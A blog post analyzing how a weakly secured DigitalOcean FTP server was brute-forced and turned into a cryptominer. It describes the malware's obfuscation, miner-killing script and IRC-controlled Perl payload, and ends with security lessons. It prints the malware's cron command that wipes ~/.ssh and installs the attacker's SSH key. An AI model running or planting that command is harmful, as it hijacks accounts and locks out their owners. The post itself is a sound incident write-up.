---
layout: post
title: "Anatomy of a crypto mining hack"
description: "One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code."
keywords: "computer hacking, crypto mining hack"
image_url: "/assets/static/images/digitalocean-cpu-alert.png"
category:
tags: ["#code"]
---
{% include setup %}
A few months ago I set up a simple ftp server to help a friend. I took a few security shortcuts which came to bite me this week when I received an alert from DigitalOcean that an instance was running hot.

<amp-img src="{{ IMG_PATH }}digitalocean-cpu-alert.png" alt="DigitalOcean CPU Alert" width="503" height="280" layout="responsive"></amp-img>

I dug into it and noticed a series of processes being run by the ftp_user - the most impactful was a command called rsync. I'm familiar with rsync which syncs files across devices - and this was nothing like that. At this point I realized that I got hacked and quickly disabled the user and killed all its processes. The CPU usage dropped back to normal and now it was time to dig into the damage.

Note that I’m far from a security engineer but am reasonably comfortable on the command line. The user was not a sudo account and this was a non critical instance so I wasn't too worried about the impact. In fact, I actually enjoyed the exercise of digging in and trying to see how I was hacked and how the entire script worked.

The origin of the hack was that I was sloppy when I created the ftp account and gave it both a weak password and didn't disable password-based authentication for SSH. This led to the attacker brute forcing the password and getting access to the ftp_user's home folder on the instance. Once there, the attacker downloaded a bunch of code that both embedded itself in the system and then started running a miner.

Before I got rid of the code I took the liberty of committing it to [GitHub](https://github.com/dangoldin/crypto-miner-hack) in order to preserve and share with others. That also gave me the time to dig in and see how it actually worked.

One of the first things I noticed was how obfuscated the code was. The file names and folders were either named after existing programs or were hidden files and directories. In addition, the names were completely nonsensical and intricately linked which made it difficult to trace the execution. I didn't go through the code step by step by digging into the files and found a few interesting tidbits.

One was that the [code created](https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L5) a cron job that would wipe the .ssh folder and then add a single ssh key - thereby locking every other user out.

{% highlight bash %}cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh{% endhighlight %}

Another was that there was a [script to kill](https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/a/init0) other miners. I assume the motivation here was to realize that if this instance was dumb enough to get hacked then it was probably hacked by someone else already so let's put a stop to that.

The most interesting part was an [encoded string](https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L4) that was passed into the Perl interpreter. The first step decoded it into a highly obfuscated Perl program and the [subsequent step](https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_2_safe_obfuscated) executed it through an eval. The [code itself](https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_3_safe_decoded) is fascinating and those more knowledgeable figured out it was connecting and listening to commands from an IRC server.

There's a fascinating amount of research one can do here to understand everything the hackers managed to do and yet it's a world most of us are only tangentially aware of. There are clear lessons here. One is to take security seriously even if it is a toy project - in this case both a strong password and limiting password-based SSH would have stopped the hack. The other is that even simpler monitoring is a huge help. If DigitalOcean had not sent me the alert my instance would still be mining cryptocoins. And the last one is that running a honeypot is an insightful experience and gives you a chance to learn something new and flex those debugging muscles.
